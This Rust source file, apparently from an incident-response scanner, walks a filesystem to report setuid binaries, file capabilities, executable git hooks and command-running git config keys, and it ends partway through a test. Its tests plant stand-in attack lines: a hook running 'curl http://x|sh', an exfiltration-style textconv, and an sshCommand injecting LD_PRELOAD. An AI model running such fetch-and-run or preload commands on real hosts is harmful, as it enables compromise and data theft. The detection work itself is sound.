//! The `--deep` traversal: one walk of the filesystem, three consumers.
//!
//! SUID bits, file capabilities and git hooks all want the same thing — every
//! file below the scan root — and a walk for each is three times the disk I/O
//! on a host an incident responder is waiting on. So there is one traversal
//! here and the three consumers read from it as it goes.
//!
//! The traversal rules matter more than what is collected. A walk that
//! descends into an unresponsive NFS mount hangs on exactly the host where
//! hanging costs most, so this one never leaves the device the scan root sits
//! on, never descends through a symlink, refuses a directory it has already
//! been in, and gives up at a ceiling rather than following a tree that
//! generates itself.

use std::collections::{BTreeMap, HashSet};
use std::ffi::OsStr;
use std::os::unix::ffi::OsStrExt;
use std::path::{Path, PathBuf};

use rustix::io::Errno;

use crate::entry::{Enablement, Entry, Flag, Kind, Trigger, hex, name_from_os};
use crate::root::Meta;
use crate::scan::{Collector, Ctx};

pub struct Deep;

/// Directory entries the walk will look at before it stops and says so. A
/// loaded workstation holds one to three million files — a developer's home
/// with a few dependency trees in it gets there alone — so five million leaves
/// real hosts room while still bounding a directory tree that generates itself
/// on demand. The device and cycle guards below are what stop the common
/// hangs; this is the backstop for the ones they do not describe.
const VISIT_CEILING: usize = 5_000_000;

/// Pseudo-filesystems, refused by name as well as by the device check. Only
/// the canonical mount points are named: a bind mount of one of these carries
/// the pseudo-filesystem's own device number, so the device check is what
/// catches it wherever it has been put.
const PSEUDO_DIRS: [&str; 4] = ["proc", "sys", "dev", "run"];

/// A walk run without privilege can meet thousands of unreadable directories,
/// and a status that lists every one is a status nobody reads. The first few
/// name the problem; the rest become a count.
const MAX_UNREADABLE_NOTES: usize = 32;

impl Collector for Deep {
    fn name(&self) -> &'static str {
        "deep"
    }

    /// The scan runner skips this collector unless `--deep` was asked for, and
    /// records it as skipped rather than as reporting nothing.
    fn deep_only(&self) -> bool {
        true
    }

    fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
        walk(cx)
    }
}

struct Walk {
    root_dev: u64,
    /// Filesystem identity of the scan root, where the device number alone
    /// is not enough to decide what counts as the same storage.
    root_fsid: Option<u64>,
    /// Device numbers proven to belong to the root's own filesystem.
    same_storage: HashSet<u64>,
    seen_dirs: HashSet<(u64, u64)>,
    repos: HashSet<(u64, u64)>,
    visited: usize,
    ceiling: usize,
    unreadable: usize,
    xattr_errors: usize,
}

impl Walk {
    fn new(root: (u64, u64)) -> Walk {
        Walk {
            root_dev: root.0,
            root_fsid: None,
            same_storage: HashSet::new(),
            seen_dirs: HashSet::from([root]),
            repos: HashSet::new(),
            visited: 0,
            ceiling: VISIT_CEILING,
            unreadable: 0,
            xattr_errors: 0,
        }
    }

    /// One unit of budget per directory entry looked at.
    fn spend(&mut self) -> bool {
        self.visited += 1;
        self.visited <= self.ceiling
    }

    /// The whole descent policy in one place.
    ///
    /// The device test keeps every network mount, every removable disk and
    /// every bind mount of a pseudo-filesystem out of the walk without reading
    /// /proc/mounts, which does not exist on an offline root. The identity
    /// test is what makes a hardlinked directory or a bind-mount loop
    /// terminate the branch instead of the scan.
    fn may_descend(&mut self, id: (u64, u64)) -> bool {
        (id.0 == self.root_dev || self.same_storage.contains(&id.0)) && self.seen_dirs.insert(id)
    }

    /// Btrfs gives every subvolume its own st_dev, so a plain device
    /// comparison stops at /home on a default Fedora, openSUSE or Arch
    /// install — and every git repository on the machine is under /home.
    /// A subvolume of the same btrfs filesystem is the same storage, and
    /// crossing into it is not the network mount the device rule exists to
    /// avoid.
    fn same_filesystem(&mut self, cx: &mut Ctx, rel: &Path, dev: u64) -> bool {
        if dev == self.root_dev || self.same_storage.contains(&dev) {
            return true;
        }
        if self.root_fsid.is_none() {
            return false;
        }
        if self.root_fsid == cx.root.filesystem_id(rel) {
            self.same_storage.insert(dev);
            return true;
        }
        false
    }
}

fn walk(cx: &mut Ctx) -> Vec<Entry> {
    let root_id = match cx.root.dir_identity("") {
        Ok(id) => id,
        Err(e) => {
            cx.note_unreadable(format!("{}: {e}", cx.root.abs("").display()));
            return Vec::new();
        }
    };

    let mut w = Walk::new(root_id);
    w.root_fsid = cx.root.filesystem_id("");
    let mut out = Vec::new();
    let mut stack = vec![PathBuf::new()];

    while let Some(dir) = stack.pop() {
        let listing = match cx.root.read_dir(&dir) {
            Ok(v) => v,
            Err(e) => {
                unreadable(cx, &mut w, &dir, &e);
                continue;
            }
        };

        for ent in listing {
            if !w.spend() {
                cx.note_unreadable(format!(
                    "walk stopped at its ceiling of {} directory entries; nothing below {} was examined",
                    w.ceiling,
                    cx.root.abs(&dir).display()
                ));
                return out;
            }

            let path = dir.join(&ent.name);

            // A symlink is evidence where it is recorded and never a way
            // through: following one is how a walk leaves the device it just
            // checked, and how it finds the same tree twice under two names.
            if ent.is_symlink {
                continue;
            }

            if ent.is_dir {
                if PSEUDO_DIRS.iter().any(|p| path == Path::new(p)) {
                    continue;
                }
                let id = match cx.root.dir_identity(&path) {
                    Ok(id) => id,
                    Err(e) => {
                        unreadable(cx, &mut w, &path, &e);
                        continue;
                    }
                };
                if !w.same_filesystem(cx, &path, id.0) || !w.may_descend(id) {
                    continue;
                }
                if ent.name == ".git" {
                    out.extend(repository(cx, &mut w, &path, &dir));
                }
                stack.push(path);
                continue;
            }

            let Ok(meta) = cx.root.stat(&path) else { continue };
            // A fifo, socket or device node carries no executable bit worth
            // reporting, and opening one can block forever.
            if !meta.is_file {
                continue;
            }
            if meta.mode & 0o6000 != 0 {
                out.push(suid(cx, &path, &ent.name, &meta));
            }
            if let Some(e) = capability(cx, &mut w, &path, &ent.name) {
                out.push(e);
            }
            if ent.name == ".git" {
                out.extend(gitdir_file(cx, &mut w, &path, &dir));
            }
        }
    }

    if w.unreadable > MAX_UNREADABLE_NOTES {
        cx.note_unreadable(format!("{} directories were unreadable in total", w.unreadable));
    }
    if w.xattr_errors > 0 {
        cx.note_unreadable(format!(
            "{} files could not be read for a security.capability attribute",
            w.xattr_errors
        ));
    }
    out
}

/// A path that was in a listing a moment ago and is gone now is a race with
/// the running system, not something the operator could not look at.
fn unreadable(cx: &mut Ctx, w: &mut Walk, rel: &Path, e: &std::io::Error) {
    if e.kind() == std::io::ErrorKind::NotFound {
        return;
    }
    w.unreadable += 1;
    if w.unreadable <= MAX_UNREADABLE_NOTES {
        cx.note_unreadable(format!("{}: {e}", cx.root.abs(rel).display()));
    }
}

// --------------------------------------------------------------- suid ----

fn suid(cx: &mut Ctx, rel: &Path, name: &OsStr, meta: &Meta) -> Entry {
    let mut e = cx.entry(Kind::SuidBinary, rel, name.to_string_lossy());
    name_from_os(&mut e, name);
    e.trigger = Trigger::Always;
    // The bit is the fact. Whether a package put it there is provenance's
    // answer in a later pass, and a setuid binary no package owns is the
    // finding — so nothing is filtered out here.
    e.enabled = Enablement::NotApplicable;
    e.target_path = Some(cx.root.abs(rel));
    if meta.mode & 0o4000 != 0 {
        e.note("setuid", "true");
        // A setuid binary runs as the file's owner, which is the one fact
        // about it that answers "so what".
        e.principal = Some(principal(cx, meta.uid));
    }
    if meta.mode & 0o2000 != 0 {
        e.note("setgid", "true");
    }
    e.note("uid", meta.uid.to_string());
    e.note("gid", meta.gid.to_string());
    e
}

fn principal(cx: &Ctx, uid: u32) -> String {
    cx.users
        .iter()
        .find(|u| u.uid == Some(uid))
        .map(|u| u.name.clone())
        .unwrap_or_else(|| uid.to_string())
}

// ------------------------------------------------------- capabilities ----

const VFS_CAP_REVISION_MASK: u32 = 0xFF00_0000;
const VFS_CAP_REVISION_1: u32 = 0x0100_0000;
const VFS_CAP_REVISION_2: u32 = 0x0200_0000;
const VFS_CAP_REVISION_3: u32 = 0x0300_0000;
const VFS_CAP_FLAGS_EFFECTIVE: u32 = 0x0000_0001;

/// The capability bits worth naming. An unnamed bit is reported as its number:
/// a number an analyst can look up is better than a name that might be wrong.
const CAP_NAMES: [(u32, &str); 8] = [
    (0, "CAP_CHOWN"),
    (1, "CAP_DAC_OVERRIDE"),
    (7, "CAP_SETUID"),
    (12, "CAP_NET_ADMIN"),
    (13, "CAP_NET_RAW"),
    (16, "CAP_SYS_MODULE"),
    (19, "CAP_SYS_PTRACE"),
    (21, "CAP_SYS_ADMIN"),
];

struct FileCaps {
    version: u32,
    effective: bool,
    permitted: u64,
    inheritable: u64,
    rootid: Option<u32>,
}

fn capability(cx: &mut Ctx, w: &mut Walk, rel: &Path, name: &OsStr) -> Option<Entry> {
    // Root owns no xattr call, so this one access names a path. The path is
    // the one the walk built out of directories it entered itself, and the
    // read does not follow a final symlink, so nothing here resolves through
    // a link an attacker planted.
    let abs = cx.root.abs(rel);
    let mut buf = [0u8; 64];
    let len = match rustix::fs::lgetxattr(&abs, "security.capability", &mut buf[..]) {
        Ok(n) => n.min(buf.len()),
        Err(e) => {
            // No attribute, or a filesystem that has no attributes at all, is
            // the answer for almost every file on the host.
            if e != Errno::NODATA && e != Errno::NOTSUP && e != Errno::NOENT {
                w.xattr_errors += 1;
            }
            return None;
        }
    };

    let mut e = cx.entry(Kind::FileCapability, rel, name.to_string_lossy());
    name_from_os(&mut e, name);
    e.trigger = Trigger::Always;
    e.enabled = Enablement::NotApplicable;
    e.target_path = Some(abs);
    e.note("cap_raw_hex", hex(&buf[..len]));
    match decode(&buf[..len]) {
        Some(c) => {
            e.note("cap_version", c.version.to_string());
            e.note("cap_effective", c.effective.to_string());
            e.note("cap_permitted", format!("{:#018x}", c.permitted));
            e.note("cap_permitted_names", cap_names(c.permitted));
            if c.inheritable != 0 {
                e.note("cap_inheritable", format!("{:#018x}", c.inheritable));
                e.note("cap_inheritable_names", cap_names(c.inheritable));
            }
            if let Some(rootid) = c.rootid {
                e.note("cap_rootid", rootid.to_string());
            }
        }
        // The attribute is there and does not parse. That is itself worth
        // reporting, with the bytes, rather than dropping the file.
        None => e.note("cap_parse_error", "not a vfs_cap_data value of a known revision"),
    }
    Some(e)
}

/// The packed `vfs_cap_data`: a little-endian magic-and-flags word, then a
/// permitted and an inheritable word per 32-bit capability block, then a
/// rootid on revision 3.
fn decode(raw: &[u8]) -> Option<FileCaps> {
    let magic = le32(raw, 0)?;
    let revision = magic & VFS_CAP_REVISION_MASK;
    let blocks = match revision {
        VFS_CAP_REVISION_1 => 1u32,
        VFS_CAP_REVISION_2 | VFS_CAP_REVISION_3 => 2,
        _ => return None,
    };

    let mut permitted = 0u64;
    let mut inheritable = 0u64;
    for block in 0..blocks {
        let at = 4 + 8 * block as usize;
        permitted |= u64::from(le32(raw, at)?) << (32 * block);
        inheritable |= u64::from(le32(raw, at + 4)?) << (32 * block);
    }

    Some(FileCaps {
        version: revision >> 24,
        effective: magic & VFS_CAP_FLAGS_EFFECTIVE != 0,
        permitted,
        inheritable,
        // A truncated revision-3 value still yields its bits; only the rootid
        // is lost with the bytes that were not there.
        rootid: (revision == VFS_CAP_REVISION_3).then(|| le32(raw, 20)).flatten(),
    })
}

fn le32(raw: &[u8], at: usize) -> Option<u32> {
    let w = raw.get(at..at + 4)?;
    Some(u32::from_le_bytes([w[0], w[1], w[2], w[3]]))
}

fn cap_names(mask: u64) -> String {
    (0..64u32)
        .filter(|bit| mask >> bit & 1 == 1)
        .map(|bit| {
            CAP_NAMES
                .iter()
                .find(|(n, _)| *n == bit)
                .map_or_else(|| bit.to_string(), |(_, name)| (*name).to_string())
        })
        .collect::<Vec<_>>()
        .join(",")
}

// ---------------------------------------------------------- git hooks ----

/// `[core]` keys that hand a command to a shell during an ordinary git
/// operation, mapped from the lowercased spelling git compares against to the
/// canonical one an operator would recognise.
const CORE_KEYS: [(&str, &str); 4] = [
    ("pager", "core.pager"),
    ("editor", "core.editor"),
    ("fsmonitor", "core.fsmonitor"),
    ("sshcommand", "core.sshCommand"),
];

fn repository(cx: &mut Ctx, w: &mut Walk, gitdir: &Path, worktree: &Path) -> Vec<Entry> {
    // Keyed on identity rather than on the path: a submodule's `.git` file and
    // the walk itself reach one directory under two names, and two entries for
    // one hook collide on the entry id.
    let Ok(id) = cx.root.dir_identity(gitdir) else { return Vec::new() };
    if !w.repos.insert(id) {
        return Vec::new();
    }
    let repo = cx.root.abs(worktree).display().to_string();
    let gitdir_abs = cx.root.abs(gitdir).display().to_string();
    let mut out = hooks(cx, w, gitdir, &repo, &gitdir_abs);
    out.extend(config(cx, gitdir, &repo, &gitdir_abs));
    out
}

fn hooks(cx: &mut Ctx, w: &mut Walk, gitdir: &Path, repo: &str, gitdir_abs: &str) -> Vec<Entry> {
    let dir = gitdir.join("hooks");
    let listing = match cx.root.read_dir(&dir) {
        Ok(v) => v,
        Err(e) => {
            unreadable(cx, w, &dir, &e);
            return Vec::new();
        }
    };

    let mut out = Vec::new();
    for ent in listing {
        // git ships every hook disabled, as `<name>.sample`. Reporting a dozen
        // of those would bury the one hook that is not a sample.
        if ent.is_dir || ent.name.as_bytes().ends_with(b".sample") {
            continue;
        }
        let rel = dir.join(&ent.name);
        // git runs a hook only if it is executable, and it runs it through a
        // symlink, so the bit that decides is the target's.
        let Ok(meta) = cx.root.stat_follow(&rel) else { continue };
        if !meta.is_file || meta.mode & 0o111 == 0 {
            continue;
        }

        let mut e = cx.entry(Kind::GitHook, &rel, ent.name.to_string_lossy());
        name_from_os(&mut e, &ent.name);
        e.trigger = Trigger::Always;
        e.enabled = Enablement::Enabled;
        e.target_path = Some(cx.root.abs(&rel));
        e.note("repository", repo);
        e.note("gitdir", gitdir_abs);
        if let Some(line) = shebang(cx, &rel) {
            e.note("interpreter", line);
        }
        out.push(e);
    }
    out
}

/// The interpreter line of a hook, which is what actually executes when the
/// hook fires. Only the first line is wanted, so this is not a truncated read
/// of the whole file and does not belong in the status as one.
fn shebang(cx: &Ctx, rel: &Path) -> Option<String> {
    let (bytes, _) = cx.root.read_capped(rel, 256).ok()?;
    let rest = bytes.strip_prefix(b"#!")?;
    let end = rest.iter().position(|b| *b == b'\n').unwrap_or(rest.len());
    Some(String::from_utf8_lossy(rest[..end].trim_ascii()).into_owned())
}

fn config(cx: &mut Ctx, gitdir: &Path, repo: &str, gitdir_abs: &str) -> Vec<Entry> {
    let rel = gitdir.join("config");
    let Some(bytes) = cx.read(&rel) else { return Vec::new() };

    let mut used: BTreeMap<String, usize> = BTreeMap::new();
    let mut out = Vec::new();
    for (key, value) in executing_keys(&bytes) {
        let mut e = cx.entry(Kind::GitHook, &rel, uniq(&mut used, key));
        e.trigger = Trigger::Always;
        e.enabled = Enablement::Enabled;
        e.target_path = first_absolute(&value);
        if std::str::from_utf8(&value).is_err() {
            e.flag(Flag::EncodingAnomaly);
            e.note("command_hex", hex(&value));
        }
        for (k, v) in env_assignments(&value) {
            e.note(&format!("env.{k}"), v);
        }
        e.command = Some(value);
        e.note("repository", repo);
        e.note("gitdir", gitdir_abs);
        out.push(e);
    }
    out
}

/// A worktree or a submodule keeps a `.git` file holding `gitdir: <path>`, and
/// the hooks that run are the ones under the directory it names.
fn gitdir_file(cx: &mut Ctx, w: &mut Walk, rel: &Path, worktree: &Path) -> Vec<Entry> {
    let Ok((bytes, _)) = cx.root.read_capped(rel, 4096) else { return Vec::new() };
    let first = bytes.split(|b| *b == b'\n').next().unwrap_or_default();
    let Some(target) = first.trim_ascii().strip_prefix(b"gitdir:") else { return Vec::new() };
    let target = target.trim_ascii();
    if target.is_empty() {
        return Vec::new();
    }
    let target = Path::new(OsStr::from_bytes(target));
    // An absolute gitdir names a path inside the system being scanned, which
    // for a mounted image is not a path on the analyst's machine.
    let gitdir =
        if target.is_absolute() { cx.root.rel(target) } else { worktree.join(target) };
    repository(cx, w, &normalize(&gitdir), worktree)
}

/// `..` resolved in the path rather than on disk. It matches how the root
/// resolves a path — confined, so a `..` above the root stays at the root —
/// and it keeps `..` out of the paths an operator is shown, where it would
/// make one repository look like two across a diff.
fn normalize(p: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for component in p.components() {
        match component {
            std::path::Component::ParentDir => {
                out.pop();
            }
            std::path::Component::Normal(name) => out.push(name),
            _ => {}
        }
    }
    out
}

/// The git config keys that run a command: the pager and editor git spawns,
/// the filesystem monitor it starts, the ssh it fetches with, and the
/// per-attribute textconv and filter programs an ordinary diff or checkout
/// hands a file to.
fn executing_keys(bytes: &[u8]) -> Vec<(String, Vec<u8>)> {
    let mut section = String::new();
    let mut subsection: Option<String> = None;
    let mut out = Vec::new();

    for line in logical_lines(bytes) {
        let line = line.trim_ascii();
        if line.is_empty() || line[0] == b'#' || line[0] == b';' {
            continue;
        }
        if line[0] == b'[' {
            (section, subsection) = parse_section(line);
            continue;
        }
        let Some((key, value)) = split_key(line) else { continue };
        let name = match (section.as_str(), subsection.as_deref(), key.as_str()) {
            ("core", None, k) => match CORE_KEYS.iter().find(|(spelling, _)| *spelling == k) {
                Some((_, canonical)) => (*canonical).to_string(),
                None => continue,
            },
            ("diff", Some(sub), "textconv") => format!("diff.{sub}.textconv"),
            ("filter", Some(sub), "clean") => format!("filter.{sub}.clean"),
            ("filter", Some(sub), "smudge") => format!("filter.{sub}.smudge"),
            _ => continue,
        };
        out.push((name, value));
    }
    out
}

/// `[filter "lfs"]` and the older `[filter.lfs]` name the same thing. Section
/// and key names are compared case-insensitively; a quoted subsection is not.
fn parse_section(line: &[u8]) -> (String, Option<String>) {
    let inner = line.strip_prefix(b"[").unwrap_or(line);
    let inner = match inner.iter().position(|b| *b == b']') {
        Some(end) => &inner[..end],
        None => inner,
    };
    if let Some(quote) = inner.iter().position(|b| *b == b'"') {
        let rest = &inner[quote + 1..];
        let end = rest.iter().rposition(|b| *b == b'"').unwrap_or(rest.len());
        return (lower(inner[..quote].trim_ascii()), Some(lossy(&rest[..end])));
    }
    match inner.iter().position(|b| *b == b'.') {
        Some(dot) => (lower(inner[..dot].trim_ascii()), Some(lossy(inner[dot + 1..].trim_ascii()))),
        None => (lower(inner.trim_ascii()), None),
    }
}

fn split_key(line: &[u8]) -> Option<(String, Vec<u8>)> {
    let eq = line.iter().position(|b| *b == b'=')?;
    let key = lower(line[..eq].trim_ascii());
    if key.is_empty() {
        return None;
    }
    Some((key, clean_value(&line[eq + 1..])))
}

/// git's value syntax: a `#` or `;` outside quotes starts a comment, a
/// backslash escapes the character after it, and the quotes themselves are not
/// part of the value. Treating a quoted `#` as a comment would discard the
/// half of a command that follows it.
fn clean_value(raw: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    let mut quoted = false;
    let mut bytes = raw.iter().copied();
    while let Some(b) = bytes.next() {
        match b {
            b'"' => quoted = !quoted,
            b'\\' => match bytes.next() {
                Some(b'n') => out.push(b'\n'),
                Some(b't') => out.push(b'\t'),
                Some(escaped) => out.push(escaped),
                None => {}
            },
            b'#' | b';' if !quoted => break,
            _ => out.push(b),
        }
    }
    out.trim_ascii().to_vec()
}

/// Physical lines joined where git continues a value on a trailing backslash.
fn logical_lines(bytes: &[u8]) -> Vec<Vec<u8>> {
    let mut out: Vec<Vec<u8>> = Vec::new();
    let mut continued = false;
    for raw in bytes.split(|b| *b == b'\n') {
        let line = raw.strip_suffix(b"\r").unwrap_or(raw);
        let more = line.last() == Some(&b'\\');
        let body = if more { &line[..line.len() - 1] } else { line };
        match out.last_mut() {
            Some(last) if continued => last.extend_from_slice(body),
            _ => out.push(body.to_vec()),
        }
        continued = more;
    }
    out
}

/// Leading `KEY=VALUE` words, which is where an LD_PRELOAD hides in a value
/// that is handed to a shell.
fn env_assignments(command: &[u8]) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for word in command.split(|b: &u8| b.is_ascii_whitespace()).filter(|w| !w.is_empty()) {
        match word.iter().position(|b| *b == b'=') {
            Some(0) | None => break,
            Some(eq) => out.push((lossy(&word[..eq]), lossy(&word[eq + 1..]))),
        }
    }
    out
}

fn first_absolute(command: &[u8]) -> Option<PathBuf> {
    let word = command.split(|b: &u8| b.is_ascii_whitespace()).find(|w| !w.is_empty())?;
    (word.first() == Some(&b'/')).then(|| PathBuf::from(OsStr::from_bytes(word).to_os_string()))
}

/// Names are hashed into the entry id, so two `core.pager` lines in one config
/// would otherwise be one id for two entries.
fn uniq(used: &mut BTreeMap<String, usize>, base: String) -> String {
    let seen = used.entry(base.clone()).or_insert(0);
    *seen += 1;
    if *seen == 1 { base } else { format!("{base}#{seen}") }
}

fn lossy(bytes: &[u8]) -> String {
    String::from_utf8_lossy(bytes).into_owned()
}

fn lower(bytes: &[u8]) -> String {
    lossy(bytes).to_ascii_lowercase()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::root::Root;
    use crate::scan::{Options, Scan, Status, run};
    use std::fs;
    use std::os::unix::fs::PermissionsExt;

    fn tree(tag: &str) -> PathBuf {
        let p = std::env::temp_dir().join(format!("unbidden-deep-{tag}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&p);
        fs::create_dir_all(&p).unwrap();
        p
    }

    fn put(root: &Path, rel: &str, bytes: &[u8], mode: u32) {
        let p = root.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(&p, bytes).unwrap();
        fs::set_permissions(&p, PermissionsExt::from_mode(mode)).unwrap();
    }

    fn scan_deep(dir: &Path) -> Scan {
        let root = Root::at(dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Deep)];
        run(&root, &Options { deep: true }, &collectors)
    }

    fn status(s: &Scan) -> &Status {
        &s.header.collectors.iter().find(|c| c.name == "deep").unwrap().status
    }

    fn of_kind(s: &Scan, kind: Kind) -> Vec<&Entry> {
        s.entries.iter().filter(|e| e.kind == kind).collect()
    }

    fn named<'a>(s: &'a Scan, name: &str) -> &'a Entry {
        let found: Vec<&Entry> = s.entries.iter().filter(|e| e.name == name).collect();
        assert_eq!(found.len(), 1, "expected exactly one {name}, got {}", found.len());
        found[0]
    }

    fn bytes_of(hex: &str) -> Vec<u8> {
        hex.as_bytes()
            .chunks(2)
            .map(|pair| u8::from_str_radix(std::str::from_utf8(pair).unwrap(), 16).unwrap())
            .collect()
    }

    #[test]
    fn the_walk_does_not_run_without_deep() {
        let dir = tree("shallow");
        put(&dir, "usr/bin/pkexec", b"#!/bin/sh\n", 0o4755);
        let root = Root::at(&dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Deep)];
        let s = run(&root, &Options { deep: false }, &collectors);
        assert!(s.entries.is_empty());
        assert!(matches!(status(&s), Status::Skipped { .. }), "{:?}", status(&s));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_setuid_file_is_reported_with_its_bit() {
        let dir = tree("suid");
        put(&dir, "usr/bin/pkexec", b"#!/bin/sh\n", 0o4755);
        put(&dir, "usr/bin/wall", b"#!/bin/sh\n", 0o2755);
        put(&dir, "usr/bin/both", b"#!/bin/sh\n", 0o6755);
        put(&dir, "usr/bin/plain", b"#!/bin/sh\n", 0o755);
        // A setgid bit on a directory means group inheritance, not execution.
        fs::create_dir_all(dir.join("srv/shared")).unwrap();
        fs::set_permissions(dir.join("srv/shared"), PermissionsExt::from_mode(0o2775)).unwrap();

        let s = scan_deep(&dir);
        let found = of_kind(&s, Kind::SuidBinary);
        assert_eq!(
            found.len(),
            3,
            "{:?}",
            found.iter().map(|e| &e.name).collect::<Vec<_>>()
        );

        let suid = named(&s, "pkexec");
        assert_eq!(suid.raw.get("setuid").map(String::as_str), Some("true"));
        assert!(!suid.raw.contains_key("setgid"));
        assert_eq!(suid.trigger, Trigger::Always);
        assert_eq!(suid.command, None);
        assert_eq!(suid.target_path, Some(dir.join("usr/bin/pkexec")));
        assert_eq!(suid.source, dir.join("usr/bin/pkexec"));
        assert!(suid.raw.contains_key("uid") && suid.raw.contains_key("gid"));

        let sgid = named(&s, "wall");
        assert_eq!(sgid.raw.get("setgid").map(String::as_str), Some("true"));
        assert!(!sgid.raw.contains_key("setuid"));
        assert_eq!(sgid.principal, None, "a setgid bit does not name a user");

        let both = named(&s, "both");
        assert!(both.raw.contains_key("setuid") && both.raw.contains_key("setgid"));
        assert_eq!(status(&s), &Status::Complete);
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_capability_value_decodes_to_the_bits_it_grants() {
        // Taken off this host with getxattr: newuidmap carries cap_setuid=ep.
        let v2 = bytes_of("0100000280000000000000000000000000000000");
        let c = decode(&v2).unwrap();
        assert_eq!(c.version, 2);
        assert!(c.effective);
        assert_eq!(c.permitted, 1 << 7);
        assert_eq!(c.inheritable, 0);
        assert_eq!(c.rootid, None);
        assert_eq!(cap_names(c.permitted), "CAP_SETUID");

        // dumpcap: cap_dac_override,cap_net_admin,cap_net_raw=eip.
        let c = decode(&bytes_of("0100000202300000023000000000000000000000")).unwrap();
        assert_eq!(cap_names(c.permitted), "CAP_DAC_OVERRIDE,CAP_NET_ADMIN,CAP_NET_RAW");
        assert_eq!(c.inheritable, c.permitted);

        // mtr-packet: cap_net_bind_service is bit 10, which is not a name this
        // collector claims to know, so it stays a number.
        let c = decode(&bytes_of("0100000200240000000000000000000000000000")).unwrap();
        assert_eq!(cap_names(c.permitted), "10,CAP_NET_RAW");

        // Revision 3 carries the uid the capability is rooted at, and puts
        // bits in the second block.
        let mut v3 = Vec::new();
        v3.extend_from_slice(&(VFS_CAP_REVISION_3 | VFS_CAP_FLAGS_EFFECTIVE).to_le_bytes());
        v3.extend_from_slice(&(1u32 << 21).to_le_bytes());
        v3.extend_from_slice(&0u32.to_le_bytes());
        v3.extend_from_slice(&(1u32 << 6).to_le_bytes());
        v3.extend_from_slice(&0u32.to_le_bytes());
        v3.extend_from_slice(&1000u32.to_le_bytes());
        let c = decode(&v3).unwrap();
        assert_eq!(c.version, 3);
        assert_eq!(c.permitted, 1 << 21 | 1 << 38);
        assert_eq!(c.rootid, Some(1000));
        assert_eq!(cap_names(c.permitted), "CAP_SYS_ADMIN,38");

        // Nothing malformed may panic or invent bits.
        assert!(decode(b"").is_none());
        assert!(decode(&[0, 0, 0, 0]).is_none());
        assert!(decode(&v2[..6]).is_none(), "a truncated value is not half-decoded");
        assert!(decode(&bytes_of("01000009800000000000000000000000")).is_none());
        let short_v3 = decode(&v3[..20]).unwrap();
        assert_eq!(short_v3.rootid, None, "the bits survive a lost rootid");
        assert_eq!(cap_names(0), "");
    }

    #[test]
    fn a_file_without_the_attribute_reports_nothing() {
        let dir = tree("nocaps");
        put(&dir, "usr/bin/ping", b"#!/bin/sh\n", 0o755);
        let s = scan_deep(&dir);
        assert!(of_kind(&s, Kind::FileCapability).is_empty());
        assert_eq!(status(&s), &Status::Complete, "ENODATA is an answer, not a failure");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn an_executable_hook_is_reported_and_a_sample_is_not() {
        let dir = tree("hooks");
        put(&dir, "srv/app/.git/hooks/post-checkout", b"#!/bin/sh\ncurl http://x|sh\n", 0o755);
        put(&dir, "srv/app/.git/hooks/pre-commit.sample", b"#!/bin/sh\n", 0o755);
        put(&dir, "srv/app/.git/hooks/pre-push", b"#!/bin/sh\n", 0o644);
        put(&dir, "srv/app/.git/HEAD", b"ref: refs/heads/main\n", 0o644);

        let s = scan_deep(&dir);
        let hooks = of_kind(&s, Kind::GitHook);
        assert_eq!(hooks.len(), 1, "{:?}", hooks.iter().map(|e| &e.name).collect::<Vec<_>>());

        let hook = named(&s, "post-checkout");
        assert_eq!(hook.trigger, Trigger::Always);
        assert_eq!(hook.enabled, Enablement::Enabled);
        assert_eq!(hook.target_path, Some(dir.join("srv/app/.git/hooks/post-checkout")));
        assert_eq!(hook.raw.get("repository").map(String::as_str), Some(dir.join("srv/app").to_str().unwrap()));
        assert_eq!(hook.raw.get("interpreter").map(String::as_str), Some("/bin/sh"));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn config_keys_that_run_a_command_are_reported() {
        let dir = tree("config");
        let config = br#"
# a comment
[core]
	repositoryformatversion = 0
	pager = "less # still the pager" ; and this is a comment
	EDITOR = vim
[diff "spec"]
	textconv = /usr/local/bin/leak --to \
http://x/y
[filter "lfs"]
	clean = git-lfs clean -- %f
	smudge = git-lfs smudge -- %f
[remote "origin"]
	url = https://example.invalid/r.git
[core]
	sshCommand = LD_PRELOAD=/tmp/e.so ssh
"#;
        put(&dir, "srv/app/.git/config", config, 0o644);
        let s = scan_deep(&dir);
        let mut names: Vec<&str> = of_kind(&s, Kind::GitHook).iter().map(|e| e.name.as_str()).collect();
        names.sort_unstable();
        assert_eq!(
            names,
            ["core.editor", "core.pager", "core.sshCommand", "diff.spec.textconv", "filter.lfs.clean", "filter.lfs.smudge"]
        );

        let pager = named(&s, "core.pager");
        assert_eq!(
            pager.command.as_deref(),
            Some(&b"less # still the pager"[..]),
            "a quoted # is part of the command, not a comment"
        );
        assert_eq!(pager.raw.get("repository").map(String::as_str), Some(dir.join("srv/app").to_str().unwrap()));
        assert_eq!(pager.source, dir.join("srv/app/.git/config"));

        let textconv = named(&s, "diff.spec.textconv");
        assert_eq!(textconv.command.as_deref(), Some(&b"/usr/local/bin/leak --to http://x/y"[..]));
        assert_eq!(textconv.target_path, Some(PathBuf::from("/usr/local/bin/leak")));

        let ssh = named(&s, "core.sshCommand");
        assert_eq!(ssh.raw.get("env.LD_PRELOAD").map(String::as_str), Some("/tmp/e.so"));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_git_file_points_the_walk_at_a_gitdir_elsewhere() {
        let dir = tree("gitfile");
        put(&dir, "srv/app/.git/modules/sub/hooks/post-merge", b"#!/bin/sh\n/tmp/x\n", 0o755);
        put(&dir, "srv/app/.git/modules/sub/config", b"[core]\n\tpager = /tmp/p\n", 0o644);
        put(&dir, "srv/app/sub/.git", b"gitdir: ../.git/modules/sub\n", 0o644);

        put(&dir, "srv/app/.git/worktrees/wt/hooks/pre-push", b"#!/bin/sh\n", 0o755);
        put(&dir, "srv/checkout/.git", b"gitdir: /srv/app/.git/worktrees/wt\n", 0o644);

        // Neither of these names a directory; neither may panic.
